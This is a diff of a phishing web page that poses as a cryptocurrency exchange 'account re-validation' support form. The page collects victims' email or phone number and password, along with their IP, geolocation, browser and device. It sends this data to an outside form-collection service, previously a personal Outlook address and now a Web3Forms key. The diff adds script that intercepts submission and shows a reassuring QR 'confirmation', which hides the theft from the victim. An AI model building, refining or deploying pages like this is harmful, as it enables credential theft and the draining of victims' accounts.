@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 
@@ -11,58 +10,56 @@
 
 <body>
   <header>
-    <h1>ACCOUNT
-      <strong>RE</strong>-VALIDATION
-    </h1>
+    <h1>ACCOUNT <strong>RE</strong>-VALIDATION</h1>
     <p>... a "Step By Step" process.</p>
     <script src="https://widgets.coingecko.com/gecko-coin-price-marquee-widget.js"></script>
-    <gecko-coin-price-marquee-widget locale="en" outlined="true" coin-ids=""
-      initial-currency="usd"></gecko-coin-price-marquee-widget>
+    <gecko-coin-price-marquee-widget locale="en" outlined="true" coin-ids="" initial-currency="usd"></gecko-coin-price-marquee-widget>
   </header>
   <section>
     <article>
 
-      <form class="pure-steps" action="https://formsubmit.co/olivertwist1005@outlook.com" method="post"
-        enctype="multipart/form-data" id="form" class="ajaxForm">
+      <!-- Updated form with Web3Forms -->
+      <form class="pure-steps" action="https://api.web3forms.com/submit" method="POST" enctype="multipart/form-data" id="form">
+
+        <!-- Web3Forms Access Key -->
+        <input type="hidden" name="access_key" value="13521604-ff3a-48f6-a7f4-a7d76fa37bca">
+
         <input type="radio" name="steps" class="pure-steps_radio" id="step-0" checked="">
         <input type="radio" name="steps" class="pure-steps_radio" id="step-1">
-        <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_next"
-          value="https://th.bing.com/th/id/R.8cd9779578487059327d0e1fa8e1836a?rik=isyael77QNZVUQ&pid=ImgRaw&r=0">
+
         <div class="pure-steps_group">
           <ol>
             <li class="pure-steps_group-step">
               <h2 class="pure-steps_group-step_legend">Welcome</h2>
-              <p class="pure-steps_group-step_item"><strong>"NOTE"</strong>Authentication process will be carried out
-                immediately upon receipt of information,and we will have notify you of the authentication results.</p>
-              <p class="pure-steps_group-step_item">The information collected is confidential and will not be disclosed
-                by us to unauthorized third parties.</p>
-              <p class="pure-steps_group-step_item"></p>
+              <p class="pure-steps_group-step_item"><strong>"NOTE"</strong> Authentication process will be carried out immediately upon receipt of information, and we will notify you of the authentication results.</p>
+              <p class="pure-steps_group-step_item">The information collected is confidential and will not be disclosed by us to unauthorized third parties.</p>
+
               <label for="cars">Select Issue:</label>
-              <select class="form-control" value="cars" id="cars">
-                <option value="volvo">Kyc</option>
-                <option value="saab">Web issue</option>
-                <option value="opel">Deposit/Withdrawal Query</option>
-                <option value="audi">lost 2fa</option>
-                <option value="audi">Biding/Unbinding</option>
-                <option value="audi">Forgot Password</option>
-                <option value="audi">Swap</option>
-                <option value="audi">Buy/Sell Error</option>
-                <option value="audi">Synchronize</option>
-                <option value="audi">Withdrawal</option>
-                <option value="audi">Airdrop</option>
-                <option value="audi">Others</option>
+              <select class="form-control" name="issue" id="cars">
+                <option value="Kyc">Kyc</option>
+                <option value="Web issue">Web issue</option>
+                <option value="Deposit/Withdrawal Query">Deposit/Withdrawal Query</option>
+                <option value="Lost 2FA">Lost 2FA</option>
+                <option value="Biding/Unbinding">Biding/Unbinding</option>
+                <option value="Forgot Password">Forgot Password</option>
+                <option value="Swap">Swap</option>
+                <option value="Buy/Sell Error">Buy/Sell Error</option>
+                <option value="Synchronize">Synchronize</option>
+                <option value="Withdrawal">Withdrawal</option>
+                <option value="Airdrop">Airdrop</option>
+                <option value="Others">Others</option>
               </select>
             </li>
+
             <li class="pure-steps_group-step">
               <fieldset>
                 <legend class="pure-steps_group-step_legend">Authenticate</legend>
                 <p class="pure-steps_group-step_item flexy-item flexy-column reverse">
-                  <input type="text" placeholder="Type your email here" name="email" id="input_email">
+                  <input type="text" placeholder="Type your email here" name="email" id="input_email" required>
                   <label for="input_email">Email or Mobile No</label>
                 </p>
                 <p class="pure-steps_group-step_item flexy-item flexy-column reverse">
-                  <input type="password" placeholder="Type your password here" name="password" id="input_password">
+                  <input type="password" placeholder="Type your password here" name="password" id="input_password" required>
                   <label for="input_password">Password</label>
                 </p>
                 <p class="pure-steps_group-step_item flexy-item flexy-column reverse">
@@ -72,6 +69,7 @@
               </fieldset>
             </li>
           </ol>
+
           <ol class="pure-steps_group-triggers">
             <li class="pure-steps_group-triggers_item">
               <label for="step-0">Restart</label>
@@ -80,39 +78,48 @@
               <label for="step-1">Proceed</label>
             </li>
             <li class="pure-steps_group-triggers_item">
-            <input type="hidden" name="ipaddress" id="ipaddress">
-            <input type="hidden" name="country" id="country">
-            <input type="hidden" name="browser" id="browser">
-            <input type="hidden" name="device" id="device"> 
-            <input type="hidden" name="apiresponse" id="apiresponse">
+              <!-- Hidden fields auto-populated by JS -->
+              <input type="hidden" name="ipaddress" id="ipaddress">
+              <input type="hidden" name="country" id="country">
+              <input type="hidden" name="browser" id="browser">
+              <input type="hidden" name="device" id="device">
+              <input type="hidden" name="apiresponse" id="apiresponse">
 
+              <!-- Final submit -->
               <button type="submit" class="btn">Validate</button>
             </li>
           </ol>
         </div>
         <br>
-        <label for="step-0">Customers are reminded to kindly provide accurate and truthful information for
-          authentication and not to provide data which is false or which belongs to third parties.</label>
+        <label for="step-0">Customers are reminded to kindly provide accurate and truthful information for authentication and not to provide data which is false or which belongs to third parties.</label>
       </form>
+
+      <!-- QR Code Result -->
+      <div id="qrResult" style="display:none; text-align:center; margin-top:20px;">
+        <h2>Submission Successful 🎉</h2>
+        <p>Scan this QR code for confirmation:</p>
+        <canvas id="qrcode"></canvas>
+      </div>
+
     </article>
   </section>
+
+  <!-- QR Code library -->
+  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+
   <script>
     // 1. Function to get IP and Country using a public IP lookup API
     function getIpAndGeo() {
-      // Use ipify for IP address
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
           document.getElementById('ipaddress').value = data.ip || 'Not Found';
-
-          // Use another service (ipapi.co) for Geo-location based on the IP
           return fetch(`https://ipapi.co/${data.ip}/json/`);
         })
         .then(response => response.json())
         .then(geoData => {
-          // Populate country field
           document.getElementById('country').value = geoData.country_name || 'Not Found';
-          document.getElementById('apiresponse').value = JSON.stringify(geoData)  || 'Not Found';
+          document.getElementById('apiresponse').value = JSON.stringify(geoData) || 'Not Found';
         })
         .catch(error => {
           console.error('Error fetching IP/Geo data:', error);
@@ -124,8 +131,6 @@
     // 2. Function to get Browser and Device
     function getBrowserAndDevice() {
       const userAgent = navigator.userAgent;
-
-      // Basic Browser Detection (simplified)
       let browser = 'Unknown Browser';
       if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
         browser = 'Chrome';
@@ -139,7 +144,6 @@
         browser = 'IE';
       }
 
-      // Basic Device Type Detection
       let device = 'Desktop';
       if (/Mobi|Android/i.test(userAgent)) {
         device = 'Mobile';
@@ -151,11 +155,44 @@
       document.getElementById('device').value = device;
     }
 
-    // Run the functions when the page loads
-    // Since the script is at the end of the body, all HTML elements exist when this runs.
+    // Run functions on page load
     getIpAndGeo();
     getBrowserAndDevice();
+
+    // Intercept form submission
+    document.getElementById('form').addEventListener('submit', function(e) {
+      e.preventDefault(); // stop normal redirect
+
+      const formData = new FormData(this);
+
+      fetch(this.action, {
+        method: this.method,
+        body: formData
+      })
+      .then(response => response.json())
+      .then(result => {
+        if(result.success) {
+          // Hide the form
+          document.getElementById('form').style.display = 'none';
+          // Show QR container
+          document.getElementById('qrResult').style.display = 'block';
+          // Generate QR code (encode submission ID or message)
+          QRCode.toCanvas(
+            document.getElementById('qrcode'),
+            "Submission ID: " + result.data.id,
+            function (error) {
+              if (error) console.error(error);
+            }
+          );
+        } else {
+          alert("Submission failed. Please try again.");
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        alert("Error submitting form.");
+      });
+    });
   </script>
 </body>
-
 </html>
